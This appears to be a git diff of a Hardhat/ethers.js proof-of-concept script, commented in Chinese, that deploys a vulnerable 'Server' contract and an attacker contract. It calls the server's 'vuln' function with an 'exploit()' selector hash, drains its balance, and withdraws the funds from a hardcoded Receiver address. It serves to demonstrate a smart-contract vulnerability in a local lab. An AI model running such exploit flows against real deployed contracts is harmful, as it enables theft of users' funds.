@@ -10,21 +10,26 @@ async function main() {
     // 返回任意长度的合约账号地址 比如我这里只要返回两个就行
     const [victim, attacker] = await ethers.getSigners();
 
-    console.log(`Victim account's address is ${await victim.getAddress()}`);
-    console.log(`Attacker account's address is ${await attacker.getAddress()}`);
+    const victimAccountAddr = await victim.getAddress();
+    const attackerAccountAddr = await attacker.getAddress();
 
-    const init_amount = ethers.parseEther("10");
+    console.log(`Victim account's address is ${victimAccountAddr}`);
+    console.log(`Attacker account's address is ${attackerAccountAddr}`);
+
+    const initAmount = ethers.parseEther("10");
 
     // 部署Server合约
     const server = await ethers.deployContract("Server", {
         signer: victim,
-        value: init_amount,
+        value: initAmount,
     });
     await server.waitForDeployment();
 
-    console.log(`Server contract deployed at ${await server.getAddress()}`)
+    const serverConAddr = await server.getAddress();
 
-    console.log(`Server contract's balance is ${await getBalanceAt(await server.getAddress())} Wei`);
+    console.log(`Server contract deployed at ${serverConAddr}`)
+
+    console.log(`Server contract's balance is ${await getBalanceAt(serverConAddr)} Wei`);
 
     // 部署Attacker合约
     const attack = await ethers.deployContract(
@@ -34,17 +39,27 @@ async function main() {
     );
     await attack.waitForDeployment();
 
-    console.log(`Attack contract deployed at ${await attack.getAddress()}`)
+    const attackConAddr = await attack.getAddress();
+
+    console.log(`Attack contract deployed at ${attackConAddr}`)
 
     const hash = (str) => {return ethers.keccak256(ethers.toUtf8Bytes(str))};
+
     // 调用Server合约的漏洞函数
-    await server.vuln(
-        await attack.getAddress(),
-        hash("exploit()")
-    )
+    await server.vuln(attackConAddr, hash("exploit()"))
     
     // 盗窃走所有资产 此时Receiver合约有log
     await server.withdraw();
+
+    console.log(`Attack contract's balance is ${await getBalanceAt(attackerAccountAddr)} Wei before withdraw`);
+
+    const receiver = await ethers.getContractAt(
+        "Receiver", 
+        "0xa16e02e87b7454126e5e10d957a927a7f5b5d2be"/* NOTE: 需要检查会不会变 */
+    );
+    await receiver.withdraw();
+
+    console.log(`Attack contract's balance is ${await getBalanceAt(attackerAccountAddr)} Wei after withdraw`);
 
 }
 
